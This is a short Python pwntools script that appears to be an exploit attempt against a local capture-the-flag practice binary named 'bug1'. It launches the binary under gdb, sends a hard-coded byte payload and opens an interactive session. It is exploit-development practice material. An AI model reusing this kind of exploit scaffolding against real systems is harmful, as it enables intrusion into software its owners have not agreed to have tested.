from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/4-bug1/bug1")
pwn.gdb.attach(p)
payload = b""
payload += b' \x04\x04\x10 \x02\x80\x02\x08\x80\x08\x08\x10\x10\x02\x02 \x80 \x80\x80@\x08\x10i\xb8\x85\x00\x00'
p.send(payload)
p.interactive()
